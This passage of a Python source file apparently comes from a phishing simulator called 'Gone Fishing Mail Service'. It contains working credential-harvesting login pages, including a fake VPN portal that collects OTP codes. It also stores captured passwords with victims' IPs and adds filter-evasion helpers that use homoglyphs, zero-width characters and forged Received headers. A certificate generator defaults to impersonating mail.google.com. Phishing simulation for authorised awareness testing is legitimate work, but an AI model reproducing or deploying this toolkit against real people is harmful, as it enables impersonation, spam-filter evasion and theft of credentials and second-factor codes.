input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:4px;font-size:0.95rem;margin-bottom:16px}input:focus{outline:none;border-color:#4a90d9}
.btn{background:#4a90d9;color:#fff;border:none;padding:12px;width:100%;border-radius:4px;font-size:1rem;cursor:pointer}.btn:hover{background:#357abd}</style></head>
<body><div class="card"><h2>Login Required</h2><p class="sub">Please sign in to continue</p>
<form method="POST"><label>Username / Email</label><input type="text" name="username" required value="{{email}}">
<label>Password</label><input type="password" name="password" required>
<input type="hidden" name="_campaign" value="{{campaign_id}}"><input type="hidden" name="_target" value="{{target_id}}">
<button type="submit" class="btn">Sign In</button></form></div></body></html>""",
        "fields": ["username", "password"],
    },
    "VPN Login": {
        "html": """<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>VPN Portal - Authentication Required</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;width:420px;padding:40px;box-shadow:0 8px 32px rgba(0,0,0,0.3)}.header{text-align:center;margin-bottom:24px}
.header h2{color:#1a1a2e;margin-bottom:4px}.header p{color:#666;font-size:0.85rem}
.shield{font-size:48px;margin-bottom:12px;display:block}
label{display:block;font-size:0.85rem;color:#333;margin-bottom:4px;font-weight:600}
input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:4px;font-size:0.95rem;margin-bottom:16px}
.btn{background:#1a1a2e;color:#fff;border:none;padding:12px;width:100%;border-radius:4px;font-size:1rem;cursor:pointer}
.btn:hover{background:#16213e}.notice{text-align:center;font-size:0.78rem;color:#999;margin-top:16px}</style></head>
<body><div class="card"><div class="header"><span class="shield">&#x1F6E1;</span><h2>VPN Portal</h2><p>Authentication required to connect</p></div>
<form method="POST"><label>Username</label><input type="text" name="username" required>
<label>Password</label><input type="password" name="password" required>
<label>OTP / 2FA Code (if enabled)</label><input type="text" name="otp" placeholder="6-digit code">
<input type="hidden" name="_campaign" value="{{campaign_id}}"><input type="hidden" name="_target" value="{{target_id}}">
<button type="submit" class="btn">Connect</button></form>
<p class="notice">This connection is encrypted and monitored</p></div></body></html>""",
        "fields": ["username", "password", "otp"],
    },
}


class LandingPageManager:
    """Manage phishing landing pages and captured credentials."""

    def __init__(self):
        self._data_dir = os.path.join(get_data_dir(), 'phishmail')
        self._pages_file = os.path.join(self._data_dir, 'landing_pages.json')
        self._captures_file = os.path.join(self._data_dir, 'captures.json')
        self._pages = {}
        self._captures = []
        self._load()

    def _load(self):
        os.makedirs(self._data_dir, exist_ok=True)
        for attr, path in [('_pages', self._pages_file), ('_captures', self._captures_file)]:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        setattr(self, attr, json.load(f))
                except Exception:
                    pass

    def _save_pages(self):
        os.makedirs(self._data_dir, exist_ok=True)
        with open(self._pages_file, 'w') as f:
            json.dump(self._pages, f, indent=2)

    def _save_captures(self):
        os.makedirs(self._data_dir, exist_ok=True)
        with open(self._captures_file, 'w') as f:
            json.dump(self._captures, f, indent=2)

    def list_builtin(self) -> dict:
        return {name: {'fields': t['fields'], 'builtin': True} for name, t in _LANDING_TEMPLATES.items()}

    def list_pages(self) -> dict:
        result = {}
        for name, t in _LANDING_TEMPLATES.items():
            result[name] = {'fields': t['fields'], 'builtin': True}
        for pid, page in self._pages.items():
            result[page.get('name', pid)] = {**page, 'id': pid, 'builtin': False}
        return result

    def get_page(self, name_or_id: str) -> Optional[dict]:
        if name_or_id in _LANDING_TEMPLATES:
            return {**_LANDING_TEMPLATES[name_or_id], 'builtin': True}
        if name_or_id in self._pages:
            return {**self._pages[name_or_id], 'builtin': False}
        # Search by name
        for pid, page in self._pages.items():
            if page.get('name') == name_or_id:
                return {**page, 'id': pid, 'builtin': False}
        return None

    def create_page(self, name: str, html: str, redirect_url: str = '',
                    fields: list = None) -> str:
        pid = uuid.uuid4().hex[:10]
        self._pages[pid] = {
            'name': name, 'html': html, 'redirect_url': redirect_url,
            'fields': fields or ['username', 'password'],
            'created': datetime.now().isoformat(),
        }
        self._save_pages()
        return pid

    def delete_page(self, pid: str) -> bool:
        if pid in self._pages:
            del self._pages[pid]
            self._save_pages()
            return True
        return False

    def record_capture(self, page_id: str, form_data: dict,
                       request_info: dict = None) -> dict:
        """Record captured credentials from a landing page submission."""
        # Filter out hidden tracking fields
        creds = {k: v for k, v in form_data.items() if not k.startswith('_')}

        capture = {
            'id': uuid.uuid4().hex[:10],
            'page': page_id,
            'campaign': form_data.get('_campaign', ''),
            'target': form_data.get('_target', ''),
            'credentials': creds,
            'timestamp': datetime.now().isoformat(),
        }
        if request_info:
            capture['ip'] = request_info.get('ip', '')
            capture['user_agent'] = request_info.get('user_agent', '')
            capture['referer'] = request_info.get('referer', '')

        self._captures.append(capture)
        # Keep last 10000 captures
        if len(self._captures) > 10000:
            self._captures = self._captures[-10000:]
        self._save_captures()
        return capture

    def get_captures(self, campaign_id: str = '', page_id: str = '') -> list:
        results = self._captures
        if campaign_id:
            results = [c for c in results if c.get('campaign') == campaign_id]
        if page_id:
            results = [c for c in results if c.get('page') == page_id]
        return results

    def clear_captures(self, campaign_id: str = '') -> int:
        if campaign_id:
            before = len(self._captures)
            self._captures = [c for c in self._captures if c.get('campaign') != campaign_id]
            count = before - len(self._captures)
        else:
            count = len(self._captures)
            self._captures = []
        self._save_captures()
        return count

    def render_page(self, name_or_id: str, campaign_id: str = '',
                    target_id: str = '', target_email: str = '') -> Optional[str]:
        """Render a landing page with tracking variables injected."""
        page = self.get_page(name_or_id)
        if not page:
            return None
        html = page['html']
        html = html.replace('{{campaign_id}}', campaign_id)
        html = html.replace('{{target_id}}', target_id)
        html = html.replace('{{email}}', target_email)
        return html


# ── Email Evasion Helpers ──────────────────────────────────────────────────

class EmailEvasion:
    """Techniques to improve email deliverability and bypass filters."""

    @staticmethod
    def homoglyph_text(text: str) -> str:
        """Replace some chars with Unicode homoglyphs to bypass text filters."""
        _MAP = {'a': '\u0430', 'e': '\u0435', 'o': '\u043e', 'p': '\u0440',
                'c': '\u0441', 'x': '\u0445', 'i': '\u0456'}
        import random
        result = []
        for ch in text:
            if ch.lower() in _MAP and random.random() < 0.3:
                result.append(_MAP[ch.lower()])
            else:
                result.append(ch)
        return ''.join(result)

    @staticmethod
    def zero_width_insert(text: str) -> str:
        """Insert zero-width chars to break keyword matching."""
        import random
        zwchars = ['\u200b', '\u200c', '\u200d', '\ufeff']
        result = []
        for ch in text:
            result.append(ch)
            if ch.isalpha() and random.random() < 0.15:
                result.append(random.choice(zwchars))
        return ''.join(result)

    @staticmethod
    def html_entity_encode(text: str) -> str:
        """Encode some chars as HTML entities."""
        import random
        result = []
        for ch in text:
            if ch.isalpha() and random.random() < 0.2:
                result.append(f'&#x{ord(ch):x};')
            else:
                result.append(ch)
        return ''.join(result)

    @staticmethod
    def randomize_headers() -> dict:
        """Generate randomized but realistic email headers."""
        import random
        mailers = [
            'Microsoft Outlook 16.0', 'Microsoft Outlook 15.0',
            'Thunderbird 102.0', 'Apple Mail (2.3654)',
            'Evolution 3.44', 'The Bat! 10.4',
        ]
        priorities = ['1 (Highest)', '3 (Normal)', '5 (Lowest)']
        return {
            'x_mailer': random.choice(mailers),
            'x_priority': random.choice(priorities),
            'x_originating_ip': f'10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}',
        }

    @staticmethod
    def spoof_received_chain(from_domain: str, hops: int = 2) -> list:
        """Generate fake Received headers to look like legitimate mail flow."""
        import random
        servers = ['mx', 'relay', 'gateway', 'edge', 'smtp', 'mail', 'mta']
        chain = []
        prev = f'{random.choice(servers)}.{from_domain}'
        for i in range(hops):
            next_srv = f'{random.choice(servers)}{i+1}.{from_domain}'
            ip = f'10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'
            ts = datetime.now().strftime('%a, %d %b %Y %H:%M:%S +0000')
            chain.append(f'from {prev} ({ip}) by {next_srv} with ESMTPS; {ts}')
            prev = next_srv
        return chain


# ── DKIM Helper ──────────────────────────────────────────────────────────────

class DKIMHelper:
    """Generate DKIM keys and sign emails."""

    @staticmethod
    def generate_keypair(domain: str) -> dict:
        """Generate RSA keypair for DKIM signing."""
        key_dir = os.path.join(get_data_dir(), 'phishmail', 'dkim')
        os.makedirs(key_dir, exist_ok=True)

        priv_path = os.path.join(key_dir, f'{domain}.key')
        pub_path = os.path.join(key_dir, f'{domain}.pub')

        try:
            subprocess.run([
                'openssl', 'genrsa', '-out', priv_path, '2048'
            ], check=True, capture_output=True)
            subprocess.run([
                'openssl', 'rsa', '-in', priv_path,
                '-pubout', '-out', pub_path
            ], check=True, capture_output=True)

            with open(pub_path, 'r') as f:
                pub_key = f.read()
            # Extract just the key data (strip PEM headers)
            lines = [l for l in pub_key.strip().split('\n')
                     if not l.startswith('-----')]
            dns_key = ''.join(lines)

            return {
                'ok': True,
                'private_key': priv_path,
                'public_key': pub_path,
                'dns_record': f'v=DKIM1; k=rsa; p={dns_key}',
                'selector': 'default',
                'domain': domain,
            }
        except FileNotFoundError:
            return {'ok': False, 'error': 'OpenSSL not found'}
        except subprocess.CalledProcessError as e:
            return {'ok': False, 'error': f'OpenSSL error: {e.stderr.decode(errors="replace")}'}

    @staticmethod
    def list_keys() -> list:
        key_dir = os.path.join(get_data_dir(), 'phishmail', 'dkim')
        if not os.path.isdir(key_dir):
            return []
        keys = []
        for f in os.listdir(key_dir):
            if f.endswith('.key'):
                domain = f[:-4]
                pub_exists = os.path.exists(os.path.join(key_dir, f'{domain}.pub'))
                keys.append({'domain': domain, 'has_pub': pub_exists})
        return keys

    @staticmethod
    def sign_message(msg_str: str, domain: str,
                     selector: str = 'default') -> Optional[str]:
        """Sign a message with DKIM. Returns the DKIM-Signature header value."""
        try:
            import dkim
            key_path = os.path.join(get_data_dir(), 'phishmail', 'dkim', f'{domain}.key')
            if not os.path.exists(key_path):
                return None
            with open(key_path, 'rb') as f:
                private_key = f.read()
            sig = dkim.sign(msg_str.encode(),
                           selector.encode(),
                           domain.encode(),
                           private_key)
            return sig.decode()
        except ImportError:
            return None
        except Exception:
            return None


# ── Singleton ────────────────────────────────────────────────────────────────

_instance = None
_lock = threading.Lock()


def get_gone_fishing() -> GoneFishingServer:
    global _instance
    if _instance is None:
        with _lock:
            if _instance is None:
                _instance = GoneFishingServer()
    return _instance


# ── Interactive CLI ──────────────────────────────────────────────────────────

def run():
    """Interactive CLI for Gone Fishing Mail Service."""
    server = get_gone_fishing()

    while True:
        print("\n" + "=" * 60)
        print("  GONE FISHING MAIL SERVICE")
        print("  Local network phishing simulator")
        print("=" * 60)
        relay_status = "RUNNING" if server.relay_running else "STOPPED"
        print(f"  SMTP Relay: {relay_status}")
        print()
        print("  1 — Compose & Send Email")
        print("  2 — Manage Campaigns")
        print("  3 — Manage Templates")
        print("  4 — Start/Stop SMTP Relay")
        print("  5 — Generate Spoofed Certificate")
        print("  6 — View Tracking Stats")
        print("  7 — Test SMTP Connection")
        print("  0 — Back")
        print()

        choice = input("  Select: ").strip()

        if choice == '0':
            break
        elif choice == '1':
            _cli_compose(server)
        elif choice == '2':
            _cli_campaigns(server)
        elif choice == '3':
            _cli_templates(server)
        elif choice == '4':
            _cli_relay(server)
        elif choice == '5':
            _cli_generate_cert(server)
        elif choice == '6':
            _cli_tracking(server)
        elif choice == '7':
            _cli_test_smtp(server)


def _cli_compose(server: GoneFishingServer):
    """Compose and send a single email."""
    print("\n--- Compose Email ---")
    from_name = input("  From Name: ").strip() or "IT Department"
    from_addr = input("  From Address: ").strip() or "it@company.local"
    to_input = input("  To (comma-separated): ").strip()
    if not to_input:
        print("  [!] No recipients specified")
        return

    to_addrs = [a.strip() for a in to_input.split(',') if a.strip()]

    # Validate
    for addr in to_addrs:
        ok, msg = _validate_local_only(addr)
        if not ok:
            print(f"  [!] {msg}")
            return

    subject = input("  Subject: ").strip() or "Test Email"

    # Template selection
    templates = server.templates.list_templates()
    print("\n  Available templates:")
    tpl_list = list(templates.keys())
    for i, name in enumerate(tpl_list, 1):
        tag = " (built-in)" if templates[name].get('builtin') else ""
        print(f"    {i} — {name}{tag}")
    print(f"    0 — Custom (enter HTML manually)")

    tpl_choice = input("  Template: ").strip()
    html_body = ''
    text_body = ''

    if tpl_choice == '0' or not tpl_choice:
        html_body = input("  HTML Body (or press Enter for plain text): ").strip()
        if not html_body:
            text_body = input("  Plain Text Body: ").strip()
    else:
        try:
            idx = int(tpl_choice) - 1
            if 0 <= idx < len(tpl_list):
                tpl = templates[tpl_list[idx]]
                html_body = tpl.get('html', '')
                text_body = tpl.get('text', '')
                if tpl.get('subject') and not subject:
                    subject = tpl['subject']
                print(f"  Using template: {tpl_list[idx]}")
            else:
                print("  [!] Invalid template selection")
                return
        except ValueError:
            print("  [!] Invalid selection")
            return

    smtp_host = input("  SMTP Host [127.0.0.1]: ").strip() or "127.0.0.1"
    smtp_port = input("  SMTP Port [25]: ").strip() or "25"
    use_tls = input("  Use TLS? [y/N]: ").strip().lower() == 'y'

    config = {
        'from_addr': from_addr,
        'from_name': from_name,
        'to_addrs': to_addrs,
        'subject': subject,
        'html_body': html_body,
        'text_body': text_body,
        'smtp_host': smtp_host,
        'smtp_port': int(smtp_port),
        'use_tls': use_tls,
    }

    print("\n  Sending...")
    result = server.send_email(config)
    if result['ok']:
        print(f"  [+] {result['message']}")
    else:
        print(f"  [-] {result['error']}")


def _cli_campaigns(server: GoneFishingServer):
    """Campaign management CLI."""
    while True:
        print("\n--- Campaign Management ---")
        campaigns = server.campaigns.list_campaigns()
        if campaigns:
            for c in campaigns:
                stats = server.campaigns.get_stats(c['id'])
                print(f"  [{c['id']}] {c['name']} — "
                      f"Status: {c['status']}, "
                      f"Targets: {stats.get('total', 0)}, "
                      f"Sent: {stats.get('sent', 0)}, "
                      f"Opened: {stats.get('opened', 0)}")
        else:
            print("  No campaigns yet")

        print("\n  1 — Create Campaign")
        print("  2 — Send Campaign")
        print("  3 — Delete Campaign")
        print("  0 — Back")

        choice = input("  Select: ").strip()
        if choice == '0':
            break
        elif choice == '1':
            name = input("  Campaign Name: ").strip()
            if not name:
                continue
            templates = server.templates.list_templates()
            tpl_list = list(templates.keys())
            print("  Templates:")
            for i, t in enumerate(tpl_list, 1):
                print(f"    {i} — {t}")
            tpl_idx = input("  Template #: ").strip()
            try:
                template = tpl_list[int(tpl_idx) - 1]
            except (ValueError, IndexError):
                print("  [!] Invalid template")
                continue
            targets = input("  Targets (comma-separated emails): ").strip()
            if not targets:
                continue
            target_list = [t.strip() for t in targets.split(',') if t.strip()]
            from_addr = input("  From Address: ").strip() or "it@company.local"
            from_name = input("  From Name: ").strip() or "IT Department"
            subject = input("  Subject: ").strip() or templates[template].get('subject', 'Notification')
            smtp_host = input("  SMTP Host [127.0.0.1]: ").strip() or "127.0.0.1"
            smtp_port = input("  SMTP Port [25]: ").strip() or "25"

            cid = server.campaigns.create_campaign(
                name, template, target_list, from_addr, from_name,
                subject, smtp_host, int(smtp_port))
            print(f"  [+] Campaign created: {cid}")
        elif choice == '2':
            cid = input("  Campaign ID: ").strip()
            result = server.send_campaign(cid)
            if result['ok']:
                print(f"  [+] {result['message']}")
            else:
                print(f"  [-] {result['error']}")
        elif choice == '3':
            cid = input("  Campaign ID: ").strip()
            if server.campaigns.delete_campaign(cid):
                print("  [+] Campaign deleted")
            else:
                print("  [-] Campaign not found")


def _cli_templates(server: GoneFishingServer):
    """Template management CLI."""
    templates = server.templates.list_templates()
    print("\n--- Email Templates ---")
    for name, tpl in templates.items():
        tag = " (built-in)" if tpl.get('builtin') else " (custom)"
        print(f"  {name}{tag}")
        if tpl.get('subject'):
            print(f"    Subject: {tpl['subject']}")

    print("\n  1 — Create Custom Template")
    print("  2 — Delete Custom Template")
    print("  0 — Back")

    choice = input("  Select: ").strip()
    if choice == '1':
        name = input("  Template Name: ").strip()
        if not name:
            return
        subject = input("  Subject: ").strip()
        print("  Enter HTML body (end with empty line):")
        lines = []
        while True:
            line = input()
            if not line:
                break
            lines.append(line)
        html = '\n'.join(lines)
        text = input("  Plain text fallback: ").strip()
        server.templates.save_template(name, html, text, subject)
        print(f"  [+] Template '{name}' saved")
    elif choice == '2':
        name = input("  Template Name to delete: ").strip()
        if server.templates.delete_template(name):
            print(f"  [+] Template '{name}' deleted")
        else:
            print("  [-] Template not found (or is built-in)")


def _cli_relay(server: GoneFishingServer):
    """SMTP relay control."""
    status = server.relay_status()
    if status['running']:
        print(f"\n  SMTP Relay: RUNNING on {status['host']}:{status['port']}")
        print(f"  Received messages: {status['received']}")
        stop = input("  Stop relay? [y/N]: ").strip().lower()
        if stop == 'y':
            server.stop_relay()
            print("  [+] Relay stopped")
    else:
        print("\n  SMTP Relay: STOPPED")
        host = input("  Bind host [0.0.0.0]: ").strip() or "0.0.0.0"
        port = input("  Bind port [2525]: ").strip() or "2525"
        result = server.start_relay(host, int(port))
        print(f"  [+] {result['message']}")


def _cli_generate_cert(server: GoneFishingServer):
    """Generate spoofed certificate."""
    print("\n--- Certificate Generator ---")
    print("  Generate a self-signed TLS certificate with custom fields.")
    cn = input("  Common Name (CN) [mail.google.com]: ").strip() or "mail.google.com"
    org = input("  Organization (O) [Google LLC]: ").strip() or "Google LLC"
    ou = input("  Org Unit (OU) []: ").strip()
    country = input("  Country (C) [US]: ").strip() or "US"

    result = server.generate_cert(cn=cn, org=org, ou=ou, country=country)
    if result['ok']:
        print(f"  [+] {result['message']}")
        print(f"  Cert: {result['cert']}")
        print(f"  Key:  {result['key']}")
    else:
        print(f"  [-] {result['error']}")


def _cli_tracking(server: GoneFishingServer):
    """View tracking stats for campaigns."""
    campaigns = server.campaigns.list_campaigns()
    if not campaigns:
        print("\n  No campaigns to show stats for")
        return
    print("\n--- Campaign Tracking ---")
    for c in campaigns:
        stats = server.campaigns.get_stats(c['id'])
        print(f"\n  Campaign: {c['name']} [{c['id']}]")
        print(f"  Status: {c['status']}")
        print(f"  Total Targets: {stats.get('total', 0)}")
        print(f"  Sent:    {stats.get('sent', 0)}")
        print(f"  Opened:  {stats.get('opened', 0)} ({stats.get('open_rate', '0%')})")
        print(f"  Clicked: {stats.get('clicked', 0)} ({stats.get('click_rate', '0%')})")

        # Show per-target details
        camp = server.campaigns.get_campaign(c['id'])
        if camp:
            for t in camp['targets']:
                status_icon = '✓' if t.get('sent_at') else '·'
                open_icon = '👁' if t.get('opened_at') else ''
                click_icon = '🖱' if t.get('clicked_at') else ''
                print(f"    {status_icon} {t['email']} {open_icon} {click_icon}")


def _cli_test_smtp(server: GoneFishingServer):
    """Test SMTP connection."""
    host = input("  SMTP Host: ").strip()
    if not host:
        return
    port = input("  Port [25]: ").strip() or "25"
    print(f"  Testing {host}:{port}...")
    result = server.test_smtp(host, int(port))
    if result['ok']:
        print(f"  [+] {result['message']}")
        if result.get('banner'):
            print(f"  Banner: {result['banner'][:200]}")
    else:
        print(f"  [-] {result['error']}")
